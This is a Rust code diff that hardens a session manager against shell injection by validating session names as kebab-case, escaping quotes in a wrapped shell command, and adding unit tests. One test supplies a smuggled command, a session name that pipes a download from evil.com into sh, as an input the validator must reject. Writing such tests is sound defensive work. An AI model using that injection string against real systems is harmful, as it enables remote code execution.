@@ -146,6 +146,11 @@ impl SessionManager {
 
     #[allow(clippy::too_many_lines)]
     pub async fn create_session(&self, req: CreateSessionRequest) -> Result<Session> {
+        // Validate session name: must be kebab-case (lowercase alphanumeric + hyphens).
+        // This prevents shell injection via wrap_command where the name is interpolated
+        // into a shell string, and matches the documented naming convention.
+        validate_session_name(&req.name)?;
+
         // Resolve ink → get command, description, and ink defaults for secrets/runtime
         let resolved = self.resolve_ink(&req)?;
         let command = resolved.command;
@@ -660,6 +665,28 @@ impl SessionManager {
     }
 }
 
+/// Validate that a session name is safe for shell interpolation and tmux usage.
+/// Allows lowercase alphanumeric characters and hyphens (kebab-case).
+/// Must start and end with alphanumeric. Max 128 chars.
+fn validate_session_name(name: &str) -> Result<()> {
+    if name.is_empty() {
+        bail!("session name must not be empty");
+    }
+    if name.len() > 128 {
+        bail!("session name must be at most 128 characters");
+    }
+    if !name
+        .bytes()
+        .all(|b| b.is_ascii_lowercase() || b.is_ascii_digit() || b == b'-')
+    {
+        bail!("session name must contain only lowercase letters, digits, and hyphens: {name}");
+    }
+    if name.starts_with('-') || name.ends_with('-') {
+        bail!("session name must not start or end with a hyphen: {name}");
+    }
+    Ok(())
+}
+
 fn validate_workdir(workdir: &str) -> Result<()> {
     let path = std::path::Path::new(workdir);
     if !path.exists() {
@@ -889,12 +916,17 @@ fn wrap_command(
     let secrets_source =
         secrets_file.map_or_else(String::new, |path| format!(". {path} && rm -f {path}; "));
 
+    // Defense-in-depth: escape session_name for shell safety even though
+    // create_session validates it as kebab-case. This prevents injection if
+    // wrap_command is ever called from a path that bypasses validation.
+    let safe_name = session_name.replace('\'', "'\\''");
+
     // Common env: session identity + suppress browser launches from agents.
     // BROWSER=true: tools using Node `open` package, Python `webbrowser`, etc. become no-ops.
     // open() wrapper: intercepts only URL opens (http/https), passes file/dir opens to real
     // /usr/bin/open so image paste, file handling, etc. still work.
     let env = format!(
-        "{secrets_source}export PULPO_SESSION_ID={session_id}; export PULPO_SESSION_NAME={session_name}; export BROWSER=true; \
+        "{secrets_source}export PULPO_SESSION_ID={session_id}; export PULPO_SESSION_NAME={safe_name}; export BROWSER=true; \
          open() {{ case \"$1\" in http://*|https://*) return 0;; *) command open \"$@\";; esac; }}; "
     );
 
@@ -907,7 +939,7 @@ fn wrap_command(
     let escaped = command.replace('\'', "'\\''");
     // After the agent exits, fall back to the user's shell so they can inspect the workdir.
     format!(
-        "{shell} -l -c '{env}{escaped}; echo '\\''[pulpo] Agent exited (session: {session_name}). Run: pulpo resume {session_name}'\\''; exec {shell} -l'"
+        "{shell} -l -c '{env}{escaped}; echo '\\''[pulpo] Agent exited (session: {safe_name}). Run: pulpo resume {safe_name}'\\''; exec {shell} -l'"
     )
 }
 
@@ -1202,6 +1234,72 @@ mod tests {
         let result = mgr.create_session(req).await;
         let err = result.unwrap_err().to_string();
         assert!(err.contains("unknown ink"), "got: {err}");
+    }
+
+    #[test]
+    fn test_validate_session_name_valid() {
+        assert!(validate_session_name("my-session").is_ok());
+        assert!(validate_session_name("a").is_ok());
+        assert!(validate_session_name("fix-auth-123").is_ok());
+        assert!(validate_session_name("nightly-20260331-0300").is_ok());
+    }
+
+    #[test]
+    fn test_validate_session_name_rejects_shell_injection() {
+        let result = validate_session_name("x'; curl evil.com | sh; echo '");
+        assert!(result.is_err());
+        assert!(result.unwrap_err().to_string().contains("lowercase"));
+    }
+
+    #[test]
+    fn test_validate_session_name_rejects_special_chars() {
+        assert!(validate_session_name("").is_err());
+        assert!(validate_session_name("Has Spaces").is_err());
+        assert!(validate_session_name("UPPERCASE").is_err());
+        assert!(validate_session_name("has.dots").is_err());
+        assert!(validate_session_name("has:colons").is_err());
+        assert!(validate_session_name("-leading-hyphen").is_err());
+        assert!(validate_session_name("trailing-hyphen-").is_err());
+    }
+
+    #[test]
+    fn test_validate_session_name_rejects_long_names() {
+        let long = "a".repeat(129);
+        assert!(validate_session_name(&long).is_err());
+        let ok = "a".repeat(128);
+        assert!(validate_session_name(&ok).is_ok());
+    }
+
+    #[test]
+    fn test_wrap_command_escapes_session_name() {
+        // Even if validation is bypassed, wrap_command should escape the name
+        let id = uuid::Uuid::new_v4();
+        let wrapped = wrap_command("echo test", &id, "safe-name", None);
+        assert!(wrapped.contains("PULPO_SESSION_NAME=safe-name"));
+        // Verify single quotes in name would be escaped (defense-in-depth)
+        let wrapped = wrap_command("echo test", &id, "name'inject", None);
+        assert!(!wrapped.contains("name'inject"));
+        assert!(wrapped.contains("name'\\''inject"));
+    }
+
+    #[tokio::test]
+    async fn test_create_session_rejects_invalid_name() {
+        let (mgr, _, _pool) = test_manager(MockBackend::new()).await;
+        let req = CreateSessionRequest {
+            name: "bad name with spaces".into(),
+            workdir: Some("/tmp".into()),
+            command: Some("echo".into()),
+            ink: None,
+            description: None,
+            metadata: None,
+            idle_threshold_secs: None,
+            worktree: None,
+            worktree_base: None,
+            runtime: None,
+            secrets: None,
+        };
+        let err = mgr.create_session(req).await.unwrap_err().to_string();
+        assert!(err.contains("lowercase"), "got: {err}");
     }
 
     #[tokio::test]
